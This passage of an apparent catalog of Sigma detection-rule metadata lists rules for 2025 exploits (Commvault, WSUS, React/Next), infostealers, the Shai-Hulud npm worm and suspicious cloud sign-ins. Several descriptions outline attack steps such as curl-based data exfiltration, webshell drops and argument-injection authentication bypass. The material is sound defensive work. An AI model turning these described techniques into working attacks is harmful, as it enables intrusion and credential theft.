  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1190
  tags:
  - attack.execution
  - attack.t1059
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  - cve.2025-55182
  time_window: ''
  references:
  - https://github.com/msanft/CVE-2025-55182
  - https://nodejs.org/api/child_process.html#class-childprocess
  - https://gist.github.com/swachchhanda000/a0228130f86a2dedfbcebb415b47f870
  - https://github.com/nasbench/Misc-Research/blob/2f651ede832ab34027a7ba005b63bb78f1ade378/Other/React-Next-Child-Processes-Notes.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 917789e1-2c1f-4bf5-8c91-6f71a017f469
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-57788/proc_creation_win_exploit_cve_2025_57788.yml
  name: Commvault QLogin with PublicSharingUser and GUID Password (CVE-2025-57788)
  description: 'Detects a qlogin.exe command attempting to authenticate as the internal
    `_+_PublicSharingUser_` using a GUID as the password.

    This could be an indicator of an attacker exploiting CVE-2025-57788 to gain initial
    access using leaked credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.t1078.001
  - detection.emerging-threats
  - cve.2025-57788
  time_window: ''
  references:
  - https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/
  false_positives:
  - Legitimate administrative scripts that use the `_+_PublicSharingUser_` account
    for valid purposes.
  notes: ''
- detection_id: bd3b3fff-a018-4994-9876-68af5809160f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-57790/proc_creation_win_exploit_cve_2025_57790.yml
  name: Commvault QOperation Path Traversal Webshell Drop (CVE-2025-57790)
  description: 'Detects the use of qoperation.exe with the -file argument to write
    a JSP file to the webroot, indicating a webshell drop.

    This is a post-authentication step corresponding to CVE-2025-57790.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 10
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - detection.emerging-threats
  - cve.2025-57790
  time_window: ''
  references:
  - https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ff0225a0-1d9a-4bae-ab26-6038b18bb6d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-57791/proc_creation_win_exploit_cve_2025_57791.yml
  name: Commvault QLogin Argument Injection Authentication Bypass (CVE-2025-57791)
  description: 'Detects the use of argument injection in the Commvault qlogin command
    - potential exploitation for CVE-2025-57791.

    An attacker can inject the `-localadmin` parameter via the password field to bypass
    authentication and gain a privileged token.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  - cve.2025-57791
  time_window: ''
  references:
  - https://labs.watchtowr.com/guess-who-would-be-stupid-enough-to-rob-the-same-vault-twice-pre-auth-rce-chains-in-commvault/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 43259cc4-1b80-4931-bd98-baea01afc196
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-59287/proc_creation_win_exploit_cve_2025_59287.yml
  name: Exploitation Activity of CVE-2025-59287 - WSUS Suspicious Child Process
  description: 'Detects the creation of command-line interpreters (cmd.exe, powershell.exe)
    as child processes of Windows Server Update Services (WSUS) related process wsusservice.exe.

    This behavior is a key indicator of exploitation for the critical remote code
    execution vulnerability such as CVE-2025-59287, where attackers spawn shells to
    conduct reconnaissance and further post-exploitation activities.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1190
  - T1203
  tags:
  - attack.execution
  - attack.initial-access
  - attack.t1190
  - attack.t1203
  - cve.2025-59287
  - detection.emerging-threats
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/microsoft-cve-2025-59287/
  - https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability
  - https://hawktrace.com/blog/CVE-2025-59287-UNAUTH
  false_positives:
  - If this activity is expected, consider filtering based on specific command lines,
    user context (e.g., `nt authority\network service`), or parent process command
    lines to reduce noise.
  notes: ''
- detection_id: e5f66e87-7d6b-404f-92fe-7aa67814b5cd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Exploits/CVE-2025-59287/win_wsus_exploit_cve_2025_59287.yml
  name: Exploitation Activity of CVE-2025-59287 - WSUS Deserialization
  description: 'Detects cast exceptions in Windows Server Update Services (WSUS) application
    logs that highly indicate exploitation attempts of CVE-2025-59287, a deserialization
    vulnerability in WSUS.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1190
  - T1203
  tags:
  - attack.execution
  - attack.initial-access
  - attack.t1190
  - attack.t1203
  - cve.2025-59287
  - detection.emerging-threats
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/cve-2025-59287/
  - https://hawktrace.com/blog/CVE-2025-59287-UNAUTH
  - https://github.com/0xBruno/WSUSploit.NET/tree/e239bce9d6b5f46a346e1e4c4d5e0a2a20d5c639
  - https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability
  false_positives:
  - Legitimate WSUS operations that may trigger similar error messages
  notes: ''
- detection_id: e710a880-1f18-4417-b6a0-b5afdf7e3023
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/file_event_macos_malware_amos_persistence.yml
  name: Atomic MacOS Stealer - Persistence Indicators
  description: 'Detects creation of persistence artifacts placed by Atomic MacOS Stealer
    in macOS systems. Recent Atomic MacOS Stealer variants have been observed dropping
    these to maintain persistent access after compromise.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: macos
  product: macos
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.004
  - T1564.001
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1564.001
  - attack.t1543.004
  - detection.emerging-threats
  time_window: ''
  references:
  - https://moonlock.com/amos-backdoor-persistent-access
  - https://github.com/bobby-tablez/TTP-Threat-Feeds/blob/45398914e631f8372c3a9fbcd339ff65ffff1b17/results/2025/10/20251001-161956-trendmicro-atomic-macos-stealer-(amos).yml#L44
  false_positives:
  - Unknown
  notes: ''
- detection_id: e710a880-1f18-4417-b6a0-b5afdf7e33da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Atomic-MacOS-Stealer/proc_creation_macos_malware_amos_curl_post.yml
  name: Atomic MacOS Stealer - FileGrabber Activity
  description: 'Detects suspicious activity associated with Atomic MacOS Stealer (Amos)
    campaigns, including execution of FileGrabber and curl-based POST requests used
    for data exfiltration. The rule identifies either the execution of FileGrabber
    targeting /tmp or the use of curl to POST sensitive user data (including files
    such as /tmp/out.zip) to remote servers, which are key indicators of Amos infostealer
    activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: macos
  product: macos
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.002
  tags:
  - attack.execution
  - attack.t1059.002
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html
  - https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing
  - https://github.com/bobby-tablez/TTP-Threat-Feeds/blob/45398914e631f8372c3a9fbcd339ff65ffff1b17/results/2025/10/20251001-161956-trendmicro-atomic-macos-stealer-(amos).yml#L36
  - https://www.jamf.com/blog/infostealers-pose-threat-to-macos/
  false_positives:
  - Unknown
  notes: ''
- detection_id: af688c76-4ce4-4309-bfdd-e896f01acf27
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Grixba/proc_creation_win_malware_grixba_recon.yml
  name: Grixba Malware Reconnaissance Activity
  description: 'Detects execution of the Grixba reconnaissance tool based on suspicious
    command-line parameter combinations.

    This tool is used by the Play ransomware group for network enumeration, data gathering,
    and event log clearing.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Reconnaissance
  techniques:
  - T1046
  - T1595.001
  tags:
  - attack.reconnaissance
  - attack.t1595.001
  - attack.discovery
  - attack.t1046
  - detection.emerging-threats
  time_window: ''
  references:
  - https://fieldeffect.com/blog/grixba-play-ransomware-impersonates-sentinelone
  - https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/
  false_positives:
  - Legitimate tools that use similar command-line argument structures (e.g., a tool
    with '--mode scan' and '--input file.txt') could trigger this rule. However, the
    specific combinations are indicative of reconnaissance or defense evasion.
  notes: ''
- detection_id: 9c3d6e32-f4c8-4d73-8b8f-95c3b383a13c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Katz-Stealer/dns_query_win_katz_stealer_domain.yml
  name: DNS Query To Katz Stealer Domains
  description: 'Detects DNS queries to domains associated with Katz Stealer malware.

    Katz Stealer is a malware variant that is known to be used for stealing sensitive
    information from compromised systems.

    In Enterprise environments, DNS queries to these domains may indicate potential
    malicious activity or compromise.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e6c7ab7c-c79d-4b84-b913-b2ec3f8e8a98
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Katz-Stealer/image_load_win_katz_stealer_payloads.yml
  name: Katz Stealer DLL Loaded
  description: 'Detects loading of DLLs associated with Katz Stealer malware 2025
    variants.

    Katz Stealer is a malware variant that is known to be used for stealing sensitive
    information from compromised systems.

    The process that loads these DLLs are very likely to be malicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1129
  tags:
  - attack.execution
  - attack.t1129
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6b0c762f-0e1b-435f-a829-5943b08fe36a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Katz-Stealer/net_dns_katz_stealer_domain.yml
  name: DNS Query To Katz Stealer Domains - Network
  description: 'Detects DNS queries to domains associated with Katz Stealer malware.

    Katz Stealer is a malware variant that is known to be used for stealing sensitive
    information from compromised systems.

    In Enterprise environments, DNS queries to these domains may indicate potential
    malicious activity or compromise.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 834c6d2f-5e98-4b2a-b453-0c4f234afedd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Katz-Stealer/zeek_http_katz_stealer_susp_useragent.yml
  name: Katz Stealer Suspicious User-Agent
  description: 'Detects network connections with a suspicious user-agent string containing
    "katz-ontop", which may indicate Katz Stealer activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: zeek
  product: http
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 0aba5685-6db6-486f-88ef-29a99c545cfd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Shai-Hulud/file_event_lnx_mal_shai_hulud_workflow.yml
  name: Shai-Hulud Malicious GitHub Workflow Creation
  description: Detects creation of shai-hulud-workflow.yml file associated with Shai
    Hulud worm targeting NPM supply chain attack that exfiltrates GitHub secrets
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: file_event
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1119
  - T1552.001
  tags:
  - attack.persistence
  - attack.credential-access
  - attack.t1552.001
  - attack.collection
  - attack.t1119
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.safetycli.com/blog/shai-hulud-npm-attack-runs-malicious-github-action
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 69fa9174-4370-4646-8d48-6a22e2853402
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Shai-Hulud/github_mal_shai_hulud_npm_attack.yml
  name: Shai-Hulud NPM Attack GitHub Activity
  description: 'Detects GitHub activity associated with the ''Shai-Hulud'' NPM supply
    chain attack. The attack involves malicious NPM packages that use stolen GitHub
    tokens to create a new branch,

    inject a malicious workflow file to exfiltrate secrets, and make private repositories
    public.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 11
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - distinct_or_novel_entity_logic
  severity: high
  status: experimental
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.impact
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.getsafety.com/blog-posts/shai-hulud-npm-attack
  false_positives:
  - Unlikely
  notes: ''
- detection_id: efd2eb09-b72e-4a61-8dc7-b1382a1e8983
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/Shai-Hulud/proc_creation_lnx_mal_shai_hululd_exfiltration.yml
  name: Shai-Hulud NPM Package Malicious Exfiltration via Curl
  description: Detects potential Shai Hulud NPM package attack attempting to exfiltrate
    data via curl to external webhook sites.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: experimental
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1005
  - T1041
  tags:
  - attack.exfiltration
  - attack.t1041
  - attack.collection
  - attack.t1005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.getsafety.com/blog-posts/shai-hulud-npm-attack
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2c76a22b-702d-48fd-8fa9-e41e2fe203b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/file_event_win_malware_funklocker_ransomware_extension.yml
  name: FunkLocker Ransomware File Creation
  description: Detects the creation of files with the ".funksec" extension, which
    is appended to encrypted files by the FunkLocker ransomware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.broadcom.com/support/security-center/protection-bulletin/funksec-ransomware
  - https://www.pcrisk.com/removal-guides/31853-funklocker-funksec-ransomware
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e99375eb-3ee0-407a-9f90-79569cc6a01c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2025/Malware/proc_creation_win_malware_kalambur_curl_socks_tor.yml
  name: Kalambur Backdoor Curl TOR SOCKS Proxy Execution
  description: Detects the execution of the "curl.exe" command, referencing "SOCKS"
    and ".onion" domains, which could be indicative of Kalambur backdoor activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1071.001
  - T1090
  - T1573
  tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1090
  - attack.t1573
  - attack.t1071.001
  - attack.t1059.001
  - attack.s0183
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blog.eclecticiq.com/sandworm-apt-targets-ukrainian-users-with-trojanized-microsoft-kms-activation-tools-in-cyber-espionage-campaigns
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 313e72de-0c0d-4d65-8c95-87f4d546eceb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/cloud/aws/cloudtrail/aws_cloudtrail_console_login_success_from_susp_locations.yml
  name: AWS Console Login Monitoring
  description: 'Detects AWS console logins from countries and IP addresses that are
    not recognized as legitimate for the organization.

    This alert can help identify potential unauthorized access attempts from unusual
    locations, which may indicate compromised credentials or malicious activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: experimental
  platform: aws
  product: cloudtrail
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.t1078.004
  time_window: ''
  references:
  - https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html
  false_positives:
  - Legitimate logins from trusted countries and IP addresses.
  - Login through services hosted through cloud providers in other regions.
  notes: ''
- detection_id: c98184ba-4a27-4e10-b7b7-da48e71f4d25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/cloud/azure/audit_logs/azure_ad_account_created_deleted_nonapproved_user.yml
  name: Account Created And Deleted By Non Approved Users
  description: Detects accounts that are created or deleted by non-approved users.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: azure
  product: auditlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-user-accounts#short-lived-accounts
  false_positives:
  - Legit administrative action
  notes: ''
- detection_id: 160f24f3-e6cc-496d-8a3d-f5d06e4ad526
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/cloud/azure/signin_logs/azure_ad_account_signin_outside_hours.yml
  name: Authentication Occuring Outside Normal Business Hours
  description: Detects user signs ins outside of normal business hours.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.privilege-escalation
  - attack.t1078
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins
  false_positives:
  - User doing actual work outside of normal business hours.
  notes: ''
- detection_id: 38a5e67b-436a-4e77-9f73-f48a82626890
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/cloud/azure/signin_logs/azure_privileged_account_no_saw_paw.yml
  name: Privilege Role Elevation Not Occuring on SAW or PAW
  description: Detects failed sign-in from a PAW or SAW device
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.initial-access
  - attack.persistence
  - attack.t1078
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor
  false_positives:
  - Not using a PAW/SAW in the environment
  notes: ''
- detection_id: cf1e5687-84e1-41af-97a9-158094efef53
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/cloud/azure/signin_logs/azure_privileged_account_sigin_expected_controls.yml
  name: Privilege Role Sign-In Outside Expected Controls
  description: Detects failed sign-in due to user not meeting expected controls for
    adminitrators
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor
  false_positives:
  - A legit admin not following proper processes
  notes: ''
- detection_id: e927a2f5-e7af-424f-ace7-70ebb49e8976
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/cloud/azure/signin_logs/azure_privileged_account_signin_outside_hours.yml
  name: Privilege Role Sign-In Outside Of Normal Hours
  description: Detects account sign ins outside of normal hours or uncommon locations.
    Administrator accounts should be investigated
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: azure
  product: signinlogs
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.privilege-escalation
  - attack.t1078
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor
  false_positives:
  - An admin doing actual work outside of normal business hours
  notes: ''
- detection_id: 94309181-d345-4cbf-b5fe-061769bdf9cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/builtin/security/win_security_admin_logon.yml
  name: User with Privileges Logon
  description: Detects logon with "Special groups" and "Special Privileges" can be
    thought of as Administrator groups or privileges.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1550
  - T1558
  - T1649
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.credential-access
  - attack.t1558
  - attack.t1649
  - attack.t1550
  time_window: ''
  references:
  - https://github.com/Yamato-Security/EnableWindowsLogSettings/blob/7f6d755d45ac7cc9fc35b0cbf498e6aa4ef19def/ConfiguringSecurityLogAuditPolicies.md
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4964
  false_positives:
  - Unknown
  notes: ''
- detection_id: dd7876d8-0f09-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/builtin/security/win_security_exploit_cve_2020_1472.yml
  name: Potential Zerologon (CVE-2020-1472) Exploitation
  description: Detects potential Netlogon Elevation of Privilege Vulnerability aka
    Zerologon (CVE-2020-1472)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - cve.2020-1472
  time_window: ''
  references:
  - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472
  - https://www.logpoint.com/en/blog/detecting-zerologon-vulnerability-in-logpoint/
  false_positives:
  - Automatic DC computer account password change
  - Legitimate DC computer account password change
  notes: ''
- detection_id: f8d98d6c-7a07-4d74-b064-dd4a3c244528
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/builtin/security/win_security_potential_pass_the_hash.yml
  name: Potential Pass the Hash Activity
  description: Detects the attack technique pass the hash which is used to move laterally
    inside the network
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1550.002
  tags:
  - attack.lateral-movement
  - attack.defense-evasion
  - attack.t1550.002
  - car.2016-04-004
  time_window: ''
  references:
  - https://github.com/nsacyber/Event-Forwarding-Guidance/tree/6e92d622fa33da911f79e7633da4263d632f9624/Events
  false_positives:
  - Administrator activity
  notes: ''
- detection_id: 68fcba0d-73a5-475e-a915-e8b4c576827e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/builtin/security/win_security_remote_registry_management_via_reg.yml
  name: Remote Registry Management Using Reg Utility
  description: Remote registry management using REG utility from non-admin workstation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  - Persistence
  techniques:
  - T1012
  - T1112
  - T1552.002
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.persistence
  - attack.discovery
  - attack.s0075
  - attack.t1012
  - attack.t1112
  - attack.t1552.002
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Legitimate usage of remote registry management by administrator
  notes: ''
- detection_id: 3ff152b2-1388-4984-9cd9-a323323fdadf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/builtin/security/win_security_susp_interactive_logons.yml
  name: Interactive Logon to Server Systems
  description: Detects interactive console logons to Server Systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  tags:
  - attack.lateral-movement
  - attack.defense-evasion
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Administrative activity via KVM or ILO board
  notes: ''
- detection_id: 12310575-e8b1-475c-a976-57ed540b349c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-placeholder/windows/dns_query/dns_query_win_wscript_cscript_resolution.yml
  name: DNS Request From Windows Script Host
  description: 'Detects unusual domain resolutions originating from CScript/WScript
    that can identify malicious javascript files executing in an environment, often
    as a result from a phishing or watering hole attack.

    '
  query_language: sigma
